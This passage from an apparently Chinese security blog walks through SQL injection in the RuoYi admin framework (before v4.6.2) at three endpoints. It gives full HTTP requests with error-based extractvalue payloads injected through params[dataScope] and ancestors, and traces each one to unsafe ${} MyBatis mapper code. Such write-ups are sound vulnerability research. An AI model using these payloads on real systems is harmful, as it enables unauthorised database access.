class="hljs-number">0</span>x7e))</span><br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754634663397-fa811ccd-7514-4f7b-8507-a41c7f41ed0b.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>此处的漏洞分析内容其实与 2.1 小节的漏洞分析一致，因此这里不在赘述。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectDeptList&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;SysDept&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;SysDeptResult&quot;</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">include</span> <span class="hljs-attr">refid</span>=<span class="hljs-string">&quot;selectDeptVo&quot;</span>/&gt;</span><br>       where d.del_flag = &#x27;0&#x27;<br>       <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;parentId != null and parentId != 0&quot;</span>&gt;</span><br>		AND parent_id = #&#123;parentId&#125;<br>	<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;deptName != null and deptName != &#x27;&#x27;&quot;</span>&gt;</span><br>		AND dept_name like concat(&#x27;%&#x27;, #&#123;deptName&#125;, &#x27;%&#x27;)<br>	<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;status != null and status != &#x27;&#x27;&quot;</span>&gt;</span><br>		AND status = #&#123;status&#125;<br>	<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>	<span class="hljs-comment">&lt;!-- 数据范围过滤 --&gt;</span><br>	$&#123;params.dataScope&#125;<br>	order by d.parent_id, d.order_num<br>   <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequiresPermissions(&quot;system:dept:list&quot;)</span><br><span class="hljs-meta">@PostMapping(&quot;/list&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> List&lt;SysDept&gt; <span class="hljs-title function_">list</span><span class="hljs-params">(SysDept dept)</span><br>&#123;<br>    List&lt;SysDept&gt; deptList = deptService.selectDeptList(dept);<br>    <span class="hljs-keyword">return</span> deptList;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="2-5-注入点-role-authUser-allocatedList接口（"><a href="#2-5-注入点-role-authUser-allocatedList接口（" class="headerlink" title="2.5 注入点/role/authUser/allocatedList接口（&lt;V4.6.2）"></a>2.5 注入点<code>/role/authUser/allocatedList</code>接口（&lt;V4.6.2）</h2><h3 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754635129514-7b26dc12-8951-4a0e-a60f-90ab79d6fad0.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">&amp;params%5BdataScope%5D=and extractvalue(1,concat(0x7e,(select user()),0x7e))<br></code></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/system/role/authUser/allocatedList</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.10<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>166<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.1.10<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.1.10/system/role/authUser/1<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=b185af4c-a86a-4b74-bf9f-8e422b68bc56<br><br><span class="language-apache"><span class="hljs-attribute">pageSize</span>=<span class="hljs-number">10</span>&amp;pageNum=<span class="hljs-number">1</span>&amp;orderByColumn=createTime&amp;isAsc=desc&amp;roleId=<span class="hljs-number">1</span>&amp;loginName=&amp;phonenumber=&amp;params%<span class="hljs-number">5</span>BdataScope%<span class="hljs-number">5</span>D=and extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select user()),<span class="hljs-number">0</span>x7e))</span><br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754635196675-73883f88-8723-4346-977a-7161bb89c526.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>此处的漏洞分析内容其实与 2.1 小节的漏洞分析一致，因此这里不在赘述。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectAllocatedList&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;SysUser&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;SysUserResult&quot;</span>&gt;</span><br>    select distinct u.user_id, u.dept_id, u.login_name, u.user_name, u.user_type, u.email, u.avatar, u.phonenumber, u.status, u.create_time<br>    from sys_user u<br>		 left join sys_dept d on u.dept_id = d.dept_id<br>		 left join sys_user_role ur on u.user_id = ur.user_id<br>		 left join sys_role r on r.role_id = ur.role_id<br>    where u.del_flag = &#x27;0&#x27; and r.role_id = #&#123;roleId&#125;<br>    <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;loginName != null and loginName != &#x27;&#x27;&quot;</span>&gt;</span><br>		AND u.login_name like concat(&#x27;%&#x27;, #&#123;loginName&#125;, &#x27;%&#x27;)<br>	<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;phonenumber != null and phonenumber != &#x27;&#x27;&quot;</span>&gt;</span><br>		AND u.phonenumber like concat(&#x27;%&#x27;, #&#123;phonenumber&#125;, &#x27;%&#x27;)<br>	<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>	<span class="hljs-comment">&lt;!-- 数据范围过滤 --&gt;</span><br>	$&#123;params.dataScope&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 查询已分配用户角色列表</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@RequiresPermissions(&quot;system:role:list&quot;)</span><br><span class="hljs-meta">@PostMapping(&quot;/authUser/allocatedList&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> TableDataInfo <span class="hljs-title function_">allocatedList</span><span class="hljs-params">(SysUser user)</span><br>&#123;<br>    startPage();<br>    List&lt;SysUser&gt; list = userService.selectAllocatedList(user);<br>    <span class="hljs-keyword">return</span> getDataTable(list);<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="2-6-注入点-role-authUser-unallocatedList接口（"><a href="#2-6-注入点-role-authUser-unallocatedList接口（" class="headerlink" title="2.6 注入点/role/authUser/unallocatedList接口（&lt;V4.6.2）"></a>2.6 注入点<code>/role/authUser/unallocatedList</code>接口（&lt;V4.6.2）</h2><h3 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>通过接口<code>/system/role/authUser/unallocatedList</code>发送 post 请求实现 sql 注入</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">loginName=&amp;phoneNumber=&amp;params%5BdataScope%5D=and extractvalue(1,concat(0x7e,(select user()),0x7e))<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754638637997-d67eb89c-90d5-4750-a0cf-1331c49c2b6f.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>此处的漏洞分析内容其实与 2.1 小节的漏洞分析一致，因此这里不在赘述。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectUnallocatedList&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;SysUser&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;SysUserResult&quot;</span>&gt;</span><br>    select distinct u.user_id, u.dept_id, u.login_name, u.user_name, u.user_type, u.email, u.avatar, u.phonenumber, u.status, u.create_time<br>    from sys_user u<br>		 left join sys_dept d on u.dept_id = d.dept_id<br>		 left join sys_user_role ur on u.user_id = ur.user_id<br>		 left join sys_role r on r.role_id = ur.role_id<br>    where u.del_flag = &#x27;0&#x27; and (r.role_id != #&#123;roleId&#125; or r.role_id IS NULL)<br>    and u.user_id not in (select u.user_id from sys_user u inner join sys_user_role ur on u.user_id = ur.user_id and ur.role_id = #&#123;roleId&#125;)<br>    <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;loginName != null and loginName != &#x27;&#x27;&quot;</span>&gt;</span><br>		AND u.login_name like concat(&#x27;%&#x27;, #&#123;loginName&#125;, &#x27;%&#x27;)<br>	<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;phonenumber != null and phonenumber != &#x27;&#x27;&quot;</span>&gt;</span><br>		AND u.phonenumber like concat(&#x27;%&#x27;, #&#123;phonenumber&#125;, &#x27;%&#x27;)<br>	<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>	<span class="hljs-comment">&lt;!-- 数据范围过滤 --&gt;</span><br>	$&#123;params.dataScope&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 查询未分配用户角色列表</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@RequiresPermissions(&quot;system:role:list&quot;)</span><br><span class="hljs-meta">@PostMapping(&quot;/authUser/unallocatedList&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> TableDataInfo <span class="hljs-title function_">unallocatedList</span><span class="hljs-params">(SysUser user)</span><br>&#123;<br>    startPage();<br>    List&lt;SysUser&gt; list = userService.selectUnallocatedList(user);<br>    <span class="hljs-keyword">return</span> getDataTable(list);<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="2-7-注入点-dept-edit接口（"><a href="#2-7-注入点-dept-edit接口（" class="headerlink" title="2.7 注入点/dept/edit接口（&lt;V4.6.2）"></a>2.7 注入点<code>/dept/edit</code>接口（&lt;V4.6.2）</h2><h3 id="漏洞复现-6"><a href="#漏洞复现-6" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>这个漏洞貌似很鸡肋，第一无法完全显示数据，第二是那个<code>ancestors</code>参数的长度似乎有限制；</p>
<p>因此想要完全的实现泄漏数据几乎不可能，想要进行 sql 盲注其实也不太可能，因为长度有限制；各位如果有能够在该漏洞实现危害扩大的方法请务必告诉我；</p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754641429583-1794b68f-1b63-450f-bdf8-e95b51bb3bd6.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754641445829-9f0eae2b-146a-4306-81f1-9d7919141c15.png" srcset="/img/loading.gif" lazyload></p>
<p>抓取到上述数据包以后，修改<code>parentId</code>传输参数为<code>0</code>，然后再添加一下 payload 发送数据包；</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">&amp;ordernum=1&amp;ancestors=100)or(extractvalue(1,concat((select user()))));#<br></code></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/system/dept/edit</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.10<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>277<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.1.10<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.1.10/system/dept/edit/101<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=bb95c391-ec91-4058-a127-3616bb3fb37d<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0<br><br><span class="language-llvm">deptId<span class="hljs-operator">=</span><span class="hljs-number">101</span>&amp;parentId<span class="hljs-operator">=</span><span class="hljs-number">0</span>&amp;parentName<span class="hljs-operator">=</span><span class="hljs-variable">%E8</span><span class="hljs-variable">%8</span>B<span class="hljs-variable">%A5</span><span class="hljs-variable">%E4</span><span class="hljs-variable">%BE</span><span class="hljs-variable">%9</span>D<span class="hljs-variable">%E7</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%91</span><span class="hljs-variable">%E6</span><span class="hljs-variable">%8</span>A<span class="hljs-variable">%80</span>&amp;deptName<span class="hljs-operator">=</span><span class="hljs-variable">%E6</span><span class="hljs-variable">%B7</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%9</span>C<span class="hljs-variable">%B3</span><span class="hljs-variable">%E6</span><span class="hljs-variable">%80</span><span class="hljs-variable">%BB</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%85</span><span class="hljs-variable">%AC</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%B8</span>&amp;orderNum<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;leader<span class="hljs-operator">=</span><span class="hljs-variable">%E8</span><span class="hljs-variable">%8</span>B<span class="hljs-variable">%A5</span><span class="hljs-variable">%E4</span><span class="hljs-variable">%BE</span><span class="hljs-variable">%9</span>D&amp;phone<span class="hljs-operator">=</span><span class="hljs-number">15888888888</span>&amp;email<span class="hljs-operator">=</span>ry<span class="hljs-variable">%40</span>qq.com&amp;status<span class="hljs-operator">=</span><span class="hljs-number">0</span>&amp;ordernum<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;ancestors<span class="hljs-operator">=</span><span class="hljs-number">100</span>)<span class="hljs-keyword">or</span>(<span class="hljs-keyword">extractvalue</span>(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>concat((<span class="hljs-keyword">select</span> user()))))<span class="hljs-comment">;#</span></span><br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754640934946-9722f587-d554-48df-a758-3c4c3f62f8a4.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="漏洞分析-6"><a href="#漏洞分析-6" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先通过 Mybatis 配置文件进行查找，发现存在可能存在 sql 注入的配置，如下，位于<code>RuoYi-4.6.0/ruoyi-system/src/main/resources/mapper/system/SysDeptMapper.xml</code>；</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">update</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;updateDeptStatus&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;SysDept&quot;</span>&gt;</span><br>	    update sys_dept<br>	    <span class="hljs-tag">&lt;<span class="hljs-name">set</span>&gt;</span><br>	        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;status != null and status != &#x27;&#x27;&quot;</span>&gt;</span>status = #&#123;status&#125;,<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>	        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;updateBy != null and updateBy != &#x27;&#x27;&quot;</span>&gt;</span>update_by = #&#123;updateBy&#125;,<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>	        update_time = sysdate()<br>       <span class="hljs-tag">&lt;/<span class="hljs-name">set</span>&gt;</span><br>	    where dept_id in ($&#123;ancestors&#125;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">update</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>利用插件<code>MybatisX</code>找到相关函数<code>RuoYi-4.6.0/ruoyi-system/src/main/java/com/ruoyi/system/mapper/SysDeptMapper.java</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 修改所在部门的父级部门状态</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> dept 部门</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateDeptStatus</span><span class="hljs-params">(SysDept dept)</span>;<br></code></pre></td></tr></table></figure>

<p>通过函数查找用法可以找到<code>RuoYi-4.6.0/ruoyi-system/src/main/java/com/ruoyi/system/service/impl/SysDeptServiceImpl.java#updateParentDeptStatus</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 修改该部门的父级部门状态</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> dept 当前部门</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateParentDeptStatus</span><span class="hljs-params">(SysDept dept)</span><br>&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">updateBy</span> <span class="hljs-operator">=</span> dept.getUpdateBy();<br>    dept = deptMapper.selectDeptById(dept.getDeptId());<br>    dept.setUpdateBy(updateBy);<br>    deptMapper.updateDeptStatus(dept);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>继续查找用法可以找到<code>RuoYi-4.6.0/ruoyi-system/src/main/java/com/ruoyi/system/service/impl/SysDeptServiceImpl.java#updateDept</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 修改保存部门信息</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> dept 部门信息</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> 结果</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-meta">@Transactional</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">updateDept</span><span class="hljs-params">(SysDept dept)</span><br>&#123;<br>    <span class="hljs-type">SysDept</span> <span class="hljs-variable">newParentDept</span> <span class="hljs-operator">=</span> deptMapper.selectDeptById(dept.getParentId());<br>    <span class="hljs-type">SysDept</span> <span class="hljs-variable">oldDept</span> <span class="hljs-operator">=</span> selectDeptById(dept.getDeptId());<br>    <span class="hljs-keyword">if</span> (StringUtils.isNotNull(newParentDept) &amp;&amp; StringUtils.isNotNull(oldDept))<br>    &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">newAncestors</span> <span class="hljs-operator">=</span> newParentDept.getAncestors() + <span class="hljs-string">&quot;,&quot;</span> + newParentDept.getDeptId();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">oldAncestors</span> <span class="hljs-operator">=</span> oldDept.getAncestors();<br>        dept.setAncestors(newAncestors);<br>        updateDeptChildren(dept.getDeptId(), newAncestors, oldAncestors);<br>    &#125;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> deptMapper.updateDept(dept);<br>    <span class="hljs-keyword">if</span> (UserConstants.DEPT_NORMAL.equals(dept.getStatus()))<br>    &#123;<br>        <span class="hljs-comment">// 如果该部门是启用状态，则启用该部门的所有上级部门</span><br>        updateParentDeptStatus(dept);<br>    &#125;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>继续查找可以发现在<code>/system/dept/edit</code>接口处理函数<code>RuoYi-4.6.0/ruoyi-admin/src/main/java/com/ruoyi/web/controller/system/SysDeptController.java#editSave</code>中进行了调用；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 保存</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Log(title = &quot;部门管理&quot;, businessType = BusinessType.UPDATE)</span><br><span class="hljs-meta">@RequiresPermissions(&quot;system:dept:edit&quot;)</span><br><span class="hljs-meta">@PostMapping(&quot;/edit&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> AjaxResult <span class="hljs-title function_">editSave</span><span class="hljs-params">(<span class="hljs-meta">@Validated</span> SysDept dept)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (UserConstants.DEPT_NAME_NOT_UNIQUE.equals(deptService.checkDeptNameUnique(dept)))<br>    &#123;<br>        <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;修改部门&#x27;&quot;</span> + dept.getDeptName() + <span class="hljs-string">&quot;&#x27;失败，部门名称已存在&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (dept.getParentId().equals(dept.getDeptId()))<br>    &#123;<br>        <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;修改部门&#x27;&quot;</span> + dept.getDeptName() + <span class="hljs-string">&quot;&#x27;失败，上级部门不能是自己&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.equals(UserConstants.DEPT_DISABLE, dept.getStatus())<br>            &amp;&amp; deptService.selectNormalChildrenDeptById(dept.getDeptId()) &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> AjaxResult.error(<span class="hljs-string">&quot;该部门包含未停用的子部门！&quot;</span>);<br>    &#125;<br>    